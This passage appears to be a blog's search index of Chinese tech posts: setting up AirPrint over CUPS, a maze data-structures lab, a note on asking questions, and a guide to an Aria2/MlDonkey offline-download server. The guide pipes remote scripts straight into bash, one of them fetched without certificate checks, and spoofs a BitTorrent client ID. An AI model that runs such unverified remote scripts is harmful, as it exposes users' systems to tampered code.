<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>将 CUPS 共享的打印机转为 Airprint 适用</title>
      <link href="/2018/Cups2Airprint/"/>
      <url>/2018/Cups2Airprint/</url>
      <content type="html"><![CDATA[<h1 id="Convert-CUPS-Printer-to-Airprint-available"><a href="#Convert-CUPS-Printer-to-Airprint-available" class="headerlink" title="Convert CUPS Printer to Airprint-available"></a>Convert CUPS Printer to Airprint-available</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>由于人民日益增长的打印需要与打印店日益下降的打印质量和开门时间存在的巨大矛盾，已经穷得吃土的我买了一个打印机。<del>然而，迫于钱没加够，又有自动双面打印的需要（手动双面打印总是把纸放反……）所以舍弃了网络打印，买了个自动双面打印功能的 USB 打印机。</del></p><h2 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h2><ol><li>一台已经连接到打印机的服务器</li><li>一台安装了对应 Linux 发行版及对应打印机驱动并连接到对应局域网的 Linux 主机</li><li>可以正常运作的 CUPS 和 Avahi Daemon</li></ol><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>请先确保您的打印机此时已经可以正常工作并能通过物理连接正常打印。</p><h3 id="CUPSD-添加打印机"><a href="#CUPSD-添加打印机" class="headerlink" title="CUPSD 添加打印机"></a>CUPSD 添加打印机</h3><p>添加一个打印机，做好默认设置，务必把打印机的默认打印设置配置好之后设为共享打印机，并对 CUPSD 打印服务器整体的打印共享功能打开。</p><h3 id="CUPSD-配置文件修改"><a href="#CUPSD-配置文件修改" class="headerlink" title="CUPSD 配置文件修改"></a>CUPSD 配置文件修改</h3><blockquote><p>/etc/cups/cupsd.conf </p></blockquote><p>在 <code>Listen /run/cups/cups.sock</code> 后面添加这个。</p><pre><code>Listen /run/cups/cups.sockListen 0.0.0.0:631PreserveJobHistoryFileDevice YesServerAlias *</code></pre><p>在这里添加对应的缺失的几行，并在 Web 管理控制端勾起 <code>Share printers connected to this system</code> 。</p><pre><code>&lt;Location /&gt;  # Allow shared printing...  Order allow,deny  Allow @LOCAL&lt;/Location&gt;&lt;Location /admin&gt;  Order allow,deny  allow @LOCAL&lt;/Location&gt;&lt;Location /admin/conf&gt;  AuthType Default  Require user @SYSTEM&lt;/Location&gt;&lt;Location /admin/log&gt;  AuthType Default  Require user @SYSTEM  Order allow,deny  allow @LOCAL&lt;/Location&gt;</code></pre><h3 id="创建-MIME-应用类型配置"><a href="#创建-MIME-应用类型配置" class="headerlink" title="创建 MIME 应用类型配置"></a>创建 MIME 应用类型配置</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># echo "image/urf urf string(0,UNIRAST&lt;00>)" > \</span>    /usr/share/cups/mime/airprint.types<span class="token comment" spellcheck="true"># echo "image/urf application/pdf 100 pdftoraster" > \</span>    /usr/share/cups/mime/airprint.convs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Avahi-Daemon-配置文件修改"><a href="#Avahi-Daemon-配置文件修改" class="headerlink" title="Avahi Daemon 配置文件修改"></a>Avahi Daemon 配置文件修改</h3><blockquote><p>/etc/avahi/avahi-daemon.conf </p></blockquote><pre><code>domain-name=local</code></pre><p>将这一行的注释符号去除。</p><h3 id="Avahi-Daemon-及-打印机支持添加"><a href="#Avahi-Daemon-及-打印机支持添加" class="headerlink" title="Avahi Daemon 及 打印机支持添加"></a>Avahi Daemon 及 打印机支持添加</h3><p>下载 参考文献 2 中的对应的 Python 脚本，并安装对应支持库。</p><p>请注意，该脚本只支持 Python 2, 安装依赖：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update -y <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libxml2-dev$ <span class="token function">sudo</span> pip2 <span class="token function">install</span> pycups$ <span class="token function">sudo</span> pip2 <span class="token function">install</span> lxml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来使用对应的参数将会对所有已经在 CUPSD 中配置好的打印机生成对应的 Avahi 服务并保存到对应目录：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> python2 ./airprint-generate.py -P <span class="token operator">&lt;</span>CUPS 服务器端口号<span class="token operator">></span> -u root -d /etc/avahi/services -p c2a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启服务，完成配置</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl restart avahi-daemon.service$ <span class="token function">sudo</span> systemctl restart org.cups.cupsd.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Enjoy"><a href="#Enjoy" class="headerlink" title="Enjoy"></a>Enjoy</h2><p>打开连接到同一局域网的苹果设备，尝试打印，你就能看到对应 PC 连接的打印机了。</p><h2 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h2><ul><li><a href="https://askubuntu.com/questions/26130/how-can-share-my-printer-so-that-i-can-use-it-with-airprint" target="_blank" rel="noopener">AskUbuntu</a></li><li><a href="https://github.com/tjfontaine/airprint-generate" target="_blank" rel="noopener">Airprint Service Generator</a></li><li><a href="https://ezunix.org/index.php?title=Enable_iOS_AirPrint_with_any_printer_supported_by_CUPS" target="_blank" rel="noopener">EzUnix Tutorial</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构实验 4 - 迷宫</title>
      <link href="/2018/DS04-Maze-EXP/"/>
      <url>/2018/DS04-Maze-EXP/</url>
      <content type="html"><![CDATA[<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><p>请先阅读 <a href="https://github.com/octowhale/Stop-Ask-Questions-The-Stupid-Ways/blob/master/README.md" target="_blank" rel="noopener">我要提问</a> 之后再看下文。</p><h1 id="数据结构实验-4-迷宫"><a href="#数据结构实验-4-迷宫" class="headerlink" title="数据结构实验 4 - 迷宫"></a>数据结构实验 4 - 迷宫</h1><p>实验代码和实验要求请参见 <a href="https://github.com/kmahyyg/datastru-ynu" target="_blank" rel="noopener">我的 Github 项目 (Private)</a></p><p>本篇博文将更加注重着眼于：</p><ul><li>具体迷宫生成实现</li><li>自动完成迷宫实现</li><li>实现过程中新学到的东西和踩的坑</li><li>libncurses 的应用</li><li>矩阵的压缩存储</li><li>其他的一些我还没想到但需要记录的东西</li></ul><h2 id="libncurses"><a href="#libncurses" class="headerlink" title="libncurses"></a>libncurses</h2><h2 id="stdarg-h"><a href="#stdarg-h" class="headerlink" title="stdarg.h"></a>stdarg.h</h2><h3 id="举一反三：-Python-Non-keyword-Argument"><a href="#举一反三：-Python-Non-keyword-Argument" class="headerlink" title="举一反三： Python - Non-keyword Argument"></a>举一反三： Python - Non-keyword Argument</h3><p>Pass the <strong>variable length argument list with single asterisk</strong>.</p><p>Inside the function, we have a loop which adds the passed argument and prints the result. We passed 3 different tuples with variable length as an argument to the function.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token operator">*</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    sum <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> num<span class="token punctuation">:</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> n    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Sum:"</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span>adder<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>adder<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>adder<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Sum: 8Sum: 22Sum: 17</code></pre><h3 id="举一反三：-Python-Keyword-Argument"><a href="#举一反三：-Python-Keyword-Argument" class="headerlink" title="举一反三： Python - Keyword Argument"></a>举一反三： Python - Keyword Argument</h3><p>Use a <strong>dictionary-like parameters with double asterisk</strong> passed to the function.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">intro</span><span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nData type of argument:"</span><span class="token punctuation">,</span>type<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                          <span class="token comment" spellcheck="true"># inside loop</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} is {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>intro<span class="token punctuation">(</span>Firstname<span class="token operator">=</span><span class="token string">"Sita"</span><span class="token punctuation">,</span> Lastname<span class="token operator">=</span><span class="token string">"Sharma"</span><span class="token punctuation">,</span> Age<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> Phone<span class="token operator">=</span><span class="token number">1234567890</span><span class="token punctuation">)</span>intro<span class="token punctuation">(</span>Firstname<span class="token operator">=</span><span class="token string">"John"</span><span class="token punctuation">,</span> Lastname<span class="token operator">=</span><span class="token string">"Wood"</span><span class="token punctuation">,</span> Email<span class="token operator">=</span><span class="token string">"johnwood@nomail.com"</span><span class="token punctuation">,</span> Country<span class="token operator">=</span><span class="token string">"Wakanda"</span><span class="token punctuation">,</span> Age<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> Phone<span class="token operator">=</span><span class="token number">9876543210</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Data type of argument: &lt;class &#39;dict&#39;&gt;Firstname is SitaLastname is SharmaAge is 22Phone is 1234567890Data type of argument: &lt;class &#39;dict&#39;&gt;Firstname is JohnLastname is WoodEmail is johnwood@nomail.comCountry is WakandaAge is 25Phone is 9876543210</code></pre><h3 id="stdarg-h-在-C-中的应用"><a href="#stdarg-h-在-C-中的应用" class="headerlink" title="stdarg.h 在 C 中的应用"></a>stdarg.h 在 C 中的应用</h3><p>建议少用或者尽量不用。</p><h4 id="库变量与库宏"><a href="#库变量与库宏" class="headerlink" title="库变量与库宏"></a>库变量与库宏</h4><p><code>va_list</code> ： 适用于 <code>va_start() va_arg() va_end()</code> 三个宏存储信息的类型，可近似等价于可变链表。</p><p><code>void va_start(va_list ap, last_arg);</code> 初始化 <code>ap</code> 变量，与 <code>va_arg</code> <code>va_end</code> 共同使用，<code>last_arg</code> 是最后一个传递给函数的已知的固定参数，即省略号前的参数。</p><p><code>type va_arg(va_list ap, type);</code> 这个宏检索函数参数列表 <code>va_list ap</code> 中类型为 <code>type</code> 的 <strong>下一个参数</strong> 。 该函数应当理解为 <strong>指针</strong> ，函数返回为 <strong>有序列表中的符合对应类型的最近一个数据</strong>，函数参数以数据结构 <strong>栈</strong> 形式存储，从左向右入栈。</p><p><code>void va_end(va_list ap);</code> 这个宏允许使用了带有 <code>va_start</code> 宏的带有可变参数的函数返回，若函数返回前未调用 <code>va_end</code> ，则结果为 <code>undefined</code>.</p><h4 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h4><p>Compile ： <code>gcc -std=c99 test.c -o test</code></p><p>test.c :</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span></span><span class="token keyword">int</span> <span class="token function">echoinfo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>strNotice<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> noti<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>noti<span class="token punctuation">,</span><span class="token string">"The printout is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">echoinfo</span><span class="token punctuation">(</span>noti<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">echoinfo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>strNotice<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str0 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    va_list stArgv<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// define a param list</span>    <span class="token function">va_start</span><span class="token punctuation">(</span>stArgv<span class="token punctuation">,</span> strNotice<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// pass the fixed param to the function</span>    str0 <span class="token operator">=</span> <span class="token function">va_arg</span><span class="token punctuation">(</span>stArgv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    str1 <span class="token operator">=</span> <span class="token function">va_arg</span><span class="token punctuation">(</span>stArgv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    str2 <span class="token operator">=</span> <span class="token function">va_arg</span><span class="token punctuation">(</span>stArgv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: %s %s %s"</span><span class="token punctuation">,</span> strNotice<span class="token punctuation">,</span> str0<span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">va_end</span><span class="token punctuation">(</span>stArgv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="迷宫生成"><a href="#迷宫生成" class="headerlink" title="迷宫生成"></a>迷宫生成</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>由于之前完全没有接触过这类实现，本次实现将采用 Python 进行一次预实现。</p><p><strong><a href="https://docs.python.org/3/library/stdtypes.html#common-sequence-operations" target="_blank" rel="noopener">Python 多维数组的浅拷贝问题 - 关于列表</a></strong> </p><p><strong><a href="https://docs.python.org/3/faq/programming.html#faq-multidimensional-list" target="_blank" rel="noopener">Python 多维数组的浅拷贝问题 - 官方 FAQ</a></strong></p><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><p>官方的建议：</p><blockquote><p>listA = [[None] *2] *3<br>这样的使用 * 创建的一个列表，并没有创建内部列表的三次拷贝，而是创建了三次同样的链接到内部的列表。所以你如果修改任何一个内部列表，三个外部链接的值也会跟随改变。</p></blockquote><p>正确的做法是：</p><ol><li>使用 <code>numpy</code> 等提供矩阵类型的工具。</li><li>使用下列代码：</li></ol><pre class="line-numbers language-python"><code class="language-python">A <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>等价于：</p><pre class="line-numbers language-python"><code class="language-python">w<span class="token punctuation">,</span> h <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span>A <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">*</span> w <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="具体的整段代码"><a href="#具体的整段代码" class="headerlink" title="具体的整段代码"></a>具体的整段代码</h4><p>参见对应 Gist：</p><h2 id="迷宫自动完成"><a href="#迷宫自动完成" class="headerlink" title="迷宫自动完成"></a>迷宫自动完成</h2><h2 id="编写过程中的实现问题"><a href="#编写过程中的实现问题" class="headerlink" title="编写过程中的实现问题"></a>编写过程中的实现问题</h2><h3 id="Dirty-Workaround-ycomlib-h"><a href="#Dirty-Workaround-ycomlib-h" class="headerlink" title="Dirty Workaround (ycomlib.h)"></a>Dirty Workaround (ycomlib.h)</h3><h1 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h1><ul><li><a href="https://docs.python.org/3/" target="_blank" rel="noopener">Python official document list</a></li><li><a href="https://blog.csdn.net/crystal_tyan/article/details/42523861" target="_blank" rel="noopener">Recursive backtracker mtod for maze generation</a></li><li><a href="https://blog.csdn.net/juzihongle1/article/details/73135920" target="_blank" rel="noopener">Three widely used mtod for maze generation</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>正确提问</title>
      <link href="/2018/Ask-Questions/"/>
      <url>/2018/Ask-Questions/</url>
      <content type="html"><![CDATA[<p>送给所有人，也送给我自己：</p><p><strong>提问之前你们 TMD 看一看这些再问好吗！！</strong></p><h2 id="Stop-Ask-Questions-the-Stupid-Way"><a href="#Stop-Ask-Questions-the-Stupid-Way" class="headerlink" title="Stop Ask Questions the Stupid Way"></a>Stop Ask Questions the Stupid Way</h2><ul><li><a href="https://github.com/octowhale/Stop-Ask-Questions-The-Stupid-Ways/blob/master/README.md" target="_blank" rel="noopener">https://github.com/octowhale/Stop-Ask-Questions-The-Stupid-Ways/blob/master/README.md</a></li></ul><h2 id="How-to-Ask-Questions-the-Smart-Way"><a href="#How-to-Ask-Questions-the-Smart-Way" class="headerlink" title="How to Ask Questions the Smart Way"></a>How to Ask Questions the Smart Way</h2><ul><li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CAMAL 离线下载套件</title>
      <link href="/2018/CAMAL-OfflineDL/"/>
      <url>/2018/CAMAL-OfflineDL/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CAMAL 离线下载套件，顾名思义：Caddy + AriaNG + Mldonkey(ED2K) + Aria2(BT+PT+HTTP+FTP+MAGNET) + Linux 用于简单搭建一个离线下载系统。</p><p>上述提到的软件均将运行在 x86_64 架构的计算机上。请在部署时注意您和您所租用的离线下载服务器所在地的法律法规，本人不承担任何相关的法律责任。</p><p>如您需要 不接受 DMCA 争议的离岸服务器，请参考本人最后一个参考文献。</p><h1 id="软件下载与基础部署"><a href="#软件下载与基础部署" class="headerlink" title="软件下载与基础部署"></a>软件下载与基础部署</h1><p>示例环境：Ubuntu 18.04.1 LTS Full Installation via LXC Virtualization</p><ul><li>Caddy Webserver with FileManager</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt update -y</span><span class="token comment" spellcheck="true"># apt install curl wget ca-certificates -y</span><span class="token comment" spellcheck="true"># curl https://getcaddy.com | bash -s personal http.filemanager,http.forwardproxy,http.ipfilter,http.login,http.minify,http.nobots,http.upload,tls.dns.rfc2136</span>$ <span class="token comment" spellcheck="true"># 编辑配置文件 /etc/Caddyfile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>启动：<code>nohup caddy -conf /etc/Caddyfile &gt; /dev/null 2&gt;&amp;1 &amp;</code></p><p>关于 CaddyServer 的 systmed 后台守护，请参见 <a href="https://github.com/mholt/caddy/tree/master/dist/init/linux-systemd" target="_blank" rel="noopener">此处</a></p><ul><li><p><a href="https://github.com/mayswind/AriaNg/releases/download/0.5.0/AriaNg-0.5.0.zip" target="_blank" rel="noopener">AriaNG Web前端</a></p></li><li><p>Aria2</p></li></ul><p>推荐使用参考文献中对应的一键脚本直接部署，方便简洁快速。如果您熟悉相关配置，您也可以选择从软件仓库安装之后手动配置。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> apt update -y$ <span class="token function">sudo</span> apt <span class="token function">install</span> aria2 -y$ <span class="token comment" spellcheck="true"># 编辑配置文件</span>$ aria2c -D --conf-path <span class="token operator">&lt;</span>Config <span class="token function">file</span> path<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一键脚本链接：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MlDonkey</li></ul><p>从软件仓库安装并启动：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> apt update -y$ <span class="token function">sudo</span> apt <span class="token function">install</span> mldonkey-server -y$ <span class="token comment" spellcheck="true"># 编辑系统配置文件 /var/lib/mldonkey/downloads.ini</span>$ <span class="token function">sudo</span> systemctl <span class="token function">enable</span> mldonkey-server$ <span class="token function">sudo</span> systemctl start mldonkey-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="部分配置文件"><a href="#部分配置文件" class="headerlink" title="部分配置文件"></a>部分配置文件</h2><p>以下仅展示可运行的最简配置文件，更多详情请参考软件的 Manual Page.</p><p>部分文件由于默认配置过长，仅展示修改过的部分。</p><h3 id="Caddy-Caddyfile"><a href="#Caddy-Caddyfile" class="headerlink" title="Caddy (Caddyfile)"></a>Caddy (Caddyfile)</h3><p>由于一般情况下，对于一些特大文件的传输，在运营商不存在劫持或文件过于冷门，且不存在文件审查的情况下，就使用 HTTP 传输就可以了，没必要对这类文件使用 HTTPS。</p><p><code>/aria</code> 为 AriaNG 入口。</p><pre><code>https://你的回源二级域名 {  root &lt;保存下载路径的上级目录&gt;  redir /aria &lt;AriaNG 的 index.html 相对 root 的路径&gt; 302  timeouts none  gzip  tls &lt;证书&gt; &lt;私钥&gt;  header / {    Strict-Transport-Security &quot;max-age=31536000;&quot;    X-XSS-Protection &quot;1; mode=block&quot;    X-Content-Type-Options &quot;nosniff&quot;    X-Frame-Options &quot;DENY&quot;  }  filemanager &lt;网盘入口相对路径&gt; {    database &lt;网盘数据库文件保存位置&gt;/filemgr.db  }}http://你的CDN加速域名 {  root &lt;保存下载路径的上级目录&gt;  redir /aria &lt;AriaNG 的 index.html 相对路径&gt; 302  timeouts none  gzip  filemanager &lt;网盘入口相对路径&gt; {    database &lt;网盘数据库文件保存位置&gt;/filemgr.db  }}</code></pre><p><strong>请在下载目录下执行运行 Caddy 的命令，以避免一些问题。</strong></p><h3 id="Aria2-aria2-conf"><a href="#Aria2-aria2-conf" class="headerlink" title="Aria2 (aria2.conf)"></a>Aria2 (aria2.conf)</h3><pre><code>## 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=&lt;保存下载路径&gt;# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16Mdisk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项file-allocation=trunc# 断点续传continue=true## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=16# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5split=20# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=1M# 单个任务上传速度限制, 默认:0#max-upload-limit=1000# 禁用IPv6, 默认:falsedisable-ipv6=false## 进度保存相关 ### 从会话文件中读取下载任务input-file=/root/.aria2/aria2.session# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=/root/.aria2/aria2.session# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800rpc-listen-port=&lt;修改为你要的端口&gt;# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项rpc-secret=&lt;远程管理密码&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件(.pem/.crt)rpc-certificate=&lt;CADDY 申请的 TLS 证书文件&gt;# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件(.key)rpc-private-key=&lt;CADDY 申请的 TLS 证书私钥文件&gt;## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:truefollow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55bt-max-peers=500# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=true# 打开IPv6 DHT功能, PT需要禁用enable-dht6=true# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=true# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=true# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=1.5# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:truebt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 